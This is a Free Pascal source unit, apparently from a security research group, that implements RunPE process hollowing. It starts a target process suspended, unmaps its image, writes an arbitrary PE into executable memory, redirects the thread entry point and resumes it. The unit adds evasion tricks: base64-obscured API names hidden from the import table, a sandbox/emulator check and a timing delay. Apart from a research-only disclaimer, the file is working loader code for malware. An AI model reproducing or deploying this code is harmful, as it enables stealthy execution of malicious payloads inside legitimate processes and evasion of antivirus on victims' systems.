
  {
 ===========================================
 MIT License

Copyright (c) 2021 0xsp security research and development

  Unit : RunPE from Memory (Proccess Forking)
  Author : 0xsp.com @zux0x3a



  the author of this module is not responsible for any misuse of this code or similair copied code, the source code and compiled binaries
  are published for the security researching only.
  the technique has been presented in online conference before the release and well-detailed paper has been posted online to help open-source community to build
  enhanced security solutions.

 ===============================================================

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.




 }
unit runner;
{$mode delphi}

interface

uses Windows,SysUtils,base64,classes;

type
  TByteArray = array of Byte;


 function isEmulated :boolean;


function Fork_P_x64(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;


implementation
 uses
   syscalls;




procedure Move_da(Destination, Source: Pointer; dLength:DWORD);
begin
  CopyMemory(Destination, Source, dLength);
end;

function isEmulated :boolean;
var
  mem : intptr;
begin
 mem := dword64(VirtualAllocExNuma(GetCurrentProcess(),0,$1000,$3000,$20,0));

 if mem = 0 then
 result := true
 else
  result := false

end;



function Fork_P_x64(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;   //works perfect with x64 bit

var
  IDH:        TImageDosHeader;
  INH:        TImageNtHeaders;
  ISH:        TImageSectionHeader;

  PI:         TProcessInformation;
  SI:         TStartUpInfo;
  CONT,CONT_B:       PContext;
  ImageBase:  pointer;
  Ret:        SIZE_T;
  i:          integer;
  Addr:       DWORD64;
  dOffset:    DWORD;
  hmod,hmod_NT,h_sys : Thandle;


begin


  Result := FALSE;


 CopyMemory(@IDH,@bfile[0], 64);

    if IDH.e_magic = IMAGE_DOS_SIGNATURE then
    begin
      Move_da(@INH, @bFile[IDH._lfanew], 264);     //248

      if INH.Signature = IMAGE_NT_SIGNATURE then
      begin
        FillChar(SI, SizeOf(TStartupInfo),#0);
        FillChar(PI, SizeOf(TProcessInformation),#0);
        SI.cb := SizeOf(TStartupInfo);

        // Hide from IAT
        hmod := LoadLibrary('kernel32.dll');
        CP := GetProcAddress(hmod,Pchar(DecodeStringBase64(CP_V)));
        Get_Con := GetProcAddress(hmod,'GetThreadContext');
        set_Con := GetProcAddress(hmod,'SetThreadContext');

        if syscalls.CP(nil, PChar(sVictim), nil, nil, false, CREATE_SUSPENDED, nil, nil, SI, PI) then

        begin
           Alloc := GetProcAddress(hmod,'VirtualAlloc');

          CONT := PCONTEXT(Alloc(nil, sizeof(CONT), MEM_COMMIT, PAGE_READWRITE));
          CONT.ContextFlags := CONTEXT_ALL;



          if syscalls.Get_Con(PI.hThread, CONT^) then
          begin

            hmod := LoadLibrary('kernel32.dll');
            RPM := GetProcAddress(hmod,Pchar(DecodeStringBase64(RPM_V)));

            syscalls.RPM(PI.hProcess, Pointer(CONT.rdx + $100), @Addr, 4, Ret);

          //   hmod := LoadLibrary('kernel32.dll');
            Allocx := GetProcAddress(hmod,'VirtualAllocEx');
            res_thread := GetProcAddress(hmod,Pchar(DecodeStringBase64(Rs_thread)));

            h_sys := LoadLibrary('ntdll.dll');
        gg := GetProcAddress(h_sys,'NtAllocateVirtualMemory');

            hmod_NT := loadLibrary('ntdll.dll');
            Nt := GetProcAddress(hmod_NT,'NtUnmapViewOfSection');
            W_M := GetprocAddress(hmod,Pchar(DecodeStringBase64(WPM)));




             if Addr = INH.OptionalHeader.ImageBase then
              begin
             if syscalls.Nt(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase)) = 0 then
             begin
            ImageBase := syscalls.Allocx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage,
             $3000, PAGE_EXECUTE_READWRITE);
             end
               else
              begin
              ImageBase := syscalls.Allocx(PI.hProcess, nil, INH.OptionalHeader.SizeOfImage, $3000, PAGE_EXECUTE_READWRITE);
             end;
            end
            else
            begin
            ImageBase := syscalls.Allocx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage,
            $3000, PAGE_EXECUTE_READWRITE);

              end;

            syscalls.W_M(PI.hProcess, ImageBase, @bFile[0], INH.OptionalHeader.SizeOfHeaders, Ret);

            dOffset := IDH._lfanew + 264;    //248
            for i := 0 to INH.FileHeader.NumberOfSections - 1 do
            begin
              Move_da(@ISH, @bFile[dOffset + (i * 40)], 40);     // 40 , 40

              syscalls.W_M(PI.hProcess, LPVOID(dword64(ImageBase) + ISH.VirtualAddress), @bFile[ISH.PointerToRawData], ISH.SizeOfRawData, Ret);

              syscalls.W_M(PI.hProcess, LPVOID(CONT.rdx + $10), @ImageBase, 8, Ret);
            end;


                //setup another contex with different flags
               CONT_B := PCONTEXT(Syscalls.Alloc(nil, sizeof(CONT_B), MEM_COMMIT, PAGE_READWRITE));
               CONT_B.ContextFlags := CONTEXT_INTEGER;

               // put some timing before setting thread
                  sleep(2000);
                // set thread context
              CONT_B.rcx := dword64(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;

            syscalls.set_Con(PI.hThread, CONT_B^);
            syscalls.res_thread(PI.hThread);

            Result := TRUE;

          end;
        end;
      end;
    end;

end;







end.

